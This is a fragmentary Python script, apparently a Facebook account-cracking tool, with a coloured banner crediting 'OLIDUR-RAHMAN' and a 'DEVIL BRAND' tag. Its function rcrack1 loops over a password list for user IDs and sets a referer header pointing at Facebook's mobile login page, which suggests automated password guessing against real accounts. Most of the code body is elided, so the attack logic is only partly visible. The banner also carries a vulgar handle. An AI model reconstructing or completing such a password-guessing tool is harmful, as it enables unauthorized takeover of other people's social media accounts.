...
\033[1;32m[-] AUTHOR    :\033[1;32m OLIDUR-RAHMAN
\033[1;32m[-] GITHUB    :\033[1;32m privatee
\033[1;32m[-] FACEBOOK  :\033[1;32m fuckyma
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS DEVIL BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m--------------------------------------------------------')
class Main:
    def __init__(self):
        self.id = []
        ...
        os.system("clear")
        print(logo)
        #os.system('xdg-open https://www.facebook.com/kn.je.id.er.link.copy.kortaco')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "referer": 'https://x.facebook.com/login.php?next=https://x.facebook.com/&refsrc=deprecated&_rdr',
